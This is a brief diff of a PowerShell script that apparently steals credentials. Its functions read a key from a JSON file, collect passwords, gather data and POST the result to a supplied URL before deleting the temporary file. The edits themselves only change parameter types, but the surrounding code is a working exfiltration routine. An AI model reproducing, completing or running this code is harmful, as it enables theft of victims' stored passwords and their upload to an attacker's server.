@@ -52,7 +52,7 @@ Add-Type @"
 Function Get-Key {
   param (
     [Parameter(mandatory=$true)]
-    [string[]] $file
+    [string] $file
   )
 
   $json = $(Get-Content -Path $file -Raw).Replace('""', '"_empty"') | ConvertFrom-Json
@@ -66,7 +66,7 @@ Function Get-Key {
 function Get-Passwords {
   param (
     [Parameter(mandatory=$true)]
-    [string[]] $file
+    [string] $file
   )
 
   $res = @{}
@@ -147,7 +147,7 @@ function Get-Datas {
 function Send-Datas {
   param (
     [Parameter(mandatory=$true)]
-    [string[]] $url
+    [string] $url
   )
 
   $tmp_file = "$Env:Temp\$((New-GUID).GUID)"
@@ -155,3 +155,4 @@ function Send-Datas {
   Invoke-WebRequest -Uri $url -Method POST -InFile $tmp_file
   Remove-Item -Path $tmp_file -Force
 }
+
